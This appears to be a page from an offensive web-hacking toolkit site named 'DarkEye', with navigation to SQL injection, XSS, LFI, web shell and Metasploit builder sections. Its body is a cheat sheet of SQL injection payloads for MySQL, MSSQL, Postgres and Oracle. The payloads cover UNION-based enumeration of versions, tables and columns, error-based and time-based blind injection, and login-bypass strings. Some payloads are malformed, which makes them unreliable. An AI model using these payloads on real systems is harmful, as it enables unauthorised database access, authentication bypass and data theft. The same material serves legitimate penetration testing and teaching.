<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../style/style.css?v=<?php echo(time())?>">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <title>DarkEye | Home</title>
</head>
<body>
  <section class="global">
    <header>
      <nav>
        <a href="../index.php"><img id="cover" src="../images/Project.jpg" alt=""></a>
        <ul>
          <a href="./sqli.php">
            
            <li>
              <i class="fa-solid fa-database"></i>
              SQL Injection
            </li>
          </a>
          
          <a href="./xss.php">
            
            <li>
              <i class="fa-brands fa-js"></i>
              XSS
            </li>
          </a>

        </li>
        <a href="./lfi.php">
          
          <li>
            <i class="fa-solid fa-folder-closed"></i>
            LFI
          </li>
        </a>
        <a href="./msf.php">
          
          <li>
            <i class="fa-solid fa-shield-halved"></i>
            MSF Builder
            </li>
          </a>
          <a href="./osint.php">
            
            <li>
              <i class="fa-solid fa-eye"></i>
              Osint
            </li>
          </a>
          <a href="./webshell.php">
            
            <li>
              <i class="fa-solid fa-viruses"></i>
              Web Shell
            </li>
          </a>
          
          <a href="./terminal.php">
            <li>
              <i class="fa-solid fa-terminal"></i>
              Terminal
            </li>
          </a>
        </ul>
      </nav>
    </header>
    <main>
    <code>
        <pre>
    Number of column
MySQL/MSSQL/PGSQL
'UNION SELECT NULL,NULL,NULL -- -
ORACLE
'UNION SELECT NULL,NULL,NULL FROM DUAL -- -
MYSQL/MSSQL/PGSQL/ORACLE - (add +1 until you get an exception)
' UNION ORDER BY 1 -- -
Database enumeration
MySQL/MSSQL
' UNION SELECT @@version -- -
Oracle
' UNION SELECT banner from v$version -- -
Oracle(2nd method)
' UNION SELECT version from v$instance -- -
Postgres
' UNION SELECT version() -- -
Tablename enumeration
MySQL/MSSQL/Postgres
' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -
Oracle
' UNION SELECT table_name,NULL FROM all_tables  -- -
Column name enumeration
MySQL/MSSQL/Postgres
' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -
Oracle
' UNION SELECT column_name,NULL FROM all_tab_columns where table_name="X"  -- -
Column values concatenation
MySQL/Postgres
' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -
MySQL(2nd method)
' UNION SELECT col1 ':' col2 from table_name limit 1 -- -
Oracle / Postgres
' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -
MSSQL
' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -
Conditional ( Error Based )
MySQL
' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -
Postgres
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -
Oracle
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -
MSSQL
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -
Time-Based
,(select * from (select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
Generic Error Based Payloads
MySQL
' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -
Postgres
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -
Oracle
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -
MSSQL
' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -
Authentication Based Payloads
or true--
") or true--
') or true--
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/
Order by and UNION Based Payloads
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
</pre>

    </code>
    </main>
  </section>
    
    <script src="./javascript/script.js"></script>
  </body>
</html>